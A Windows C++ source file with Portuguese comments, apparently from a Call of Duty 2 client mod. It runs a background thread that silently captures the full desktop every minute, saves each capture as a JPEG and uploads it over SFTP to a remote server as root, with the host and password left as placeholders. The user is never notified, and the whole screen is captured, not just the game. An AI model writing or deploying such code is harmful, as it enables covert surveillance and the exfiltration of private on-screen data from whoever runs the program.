#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctime>

#include "sftp.h"
#include "../shared/cod2.h"

CRITICAL_SECTION criticalSectionSs;
bool stopThreadsSs = false;
HANDLE threadHandlesSs[3];

// Função para converter de BGR para RGB
void convert_bgr_to_rgb(unsigned char *pixels, int width, int height)
{
    for (int i = 0; i < width * height; i++)
    {
        unsigned char temp = pixels[i * 3];
        pixels[i * 3] = pixels[i * 3 + 2];
        pixels[i * 3 + 2] = temp;
    }
}

int save_as_jpeg(const char *filename, unsigned char *imageData, int width, int height)
{
    // Usando a função da stb para salvar como JPEG
    if (stbi_write_jpg(filename, width, height, 3, imageData, 30))
    {
        return 0;
    }
    else
    {
        return -1;
    }
}

void get_timestamped_filename(char *filename, size_t size)
{
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);

    strftime(filename, size, "screenshot_%Y-%m-%d_%H-%M-%S.jpg", tm_info);
}

int CaptureScreenshot()
{
    HDC hdcScreen = GetDC(NULL);
    if (hdcScreen == NULL)
    {
        printf("Erro ao obter contexto de tela.\n");
        return -1;
    }

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (hdcMem == NULL)
    {
        printf("Erro ao criar contexto de memória.\n");
        ReleaseDC(NULL, hdcScreen);
        return -1;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    if (hBitmap == NULL)
    {
        printf("Erro ao criar bitmap.\n");
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return -1;
    }

    HGDIOBJ hOldBitmap = SelectObject(hdcMem, hBitmap);

    if (!BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY))
    {
        printf("Erro ao capturar a tela.\n");
    }

    BITMAPINFOHEADER bih;
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = width;
    bih.biHeight = -height; // Para armazenar as linhas de baixo para cima
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;

    BYTE *pixels = (BYTE *)malloc(width * height * 3);
    if (pixels)
    {
        GetDIBits(hdcMem, hBitmap, 0, height, pixels, (BITMAPINFO *)&bih, DIB_RGB_COLORS);

        // Converter BGR para RGB
        convert_bgr_to_rgb(pixels, width, height);

        char filename[100];
        get_timestamped_filename(filename, sizeof(filename));

        // Salvar a imagem como JPG usando stb_image_write
        save_as_jpeg(filename, pixels, width, height);

        /////////
        char screenshotName[256];

        const char *host = "xxx";
        int port = 1111;
        const char *username = "root";
        const char *password = "xxx";
        const char *local_path = filename;
        const char *remote_path = "/var/www/uploads/";

        snprintf(screenshotName, sizeof(screenshotName), "%s%s", remote_path, local_path);

        int resultado = sftp_upload(host, port, username, password, local_path, screenshotName);
        if (resultado == 0)
        {
            Com_Printf("Envio de arquivo concluIdo!\n");
        }
        else
        {
            Com_Printf("Falha ao enviar o arquivo.\n");
        }

        ///

        free(pixels);
    }

    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    printf("Screenshot salva como screenshot.jpg\n");
    return 0;
}

// Função executada por cada thread
DWORD WINAPI ScreenshotThread(LPVOID lpParam)
{
    while (!stopThreadsSs)
    {
        EnterCriticalSection(&criticalSectionSs);

        CaptureScreenshot();

        LeaveCriticalSection(&criticalSectionSs);
        Sleep(60000);
    }
    return 0;
}

void ScreenshotStartThreads(int numThreads)
{
    InitializeCriticalSection(&criticalSectionSs);
    for (int i = 0; i < numThreads; ++i)
    {
        int *threadID = (int *)malloc(sizeof(int));
        *threadID = i + 1;
        threadHandlesSs[i] = CreateThread(NULL, 0, ScreenshotThread, threadID, 0, NULL);
        if (!threadHandlesSs[i])
        {
            free(threadID);
        }
    }
}

void ScreenshotStopThreads(int numThreads)
{
    stopThreadsSs = true;
    WaitForMultipleObjects(numThreads, threadHandlesSs, TRUE, INFINITE);
    for (int i = 0; i < numThreads; ++i)
    {
        CloseHandle(threadHandlesSs[i]);
    }
    DeleteCriticalSection(&criticalSectionSs);
}

void screenshot_init()
{
    ScreenshotStartThreads(1);
}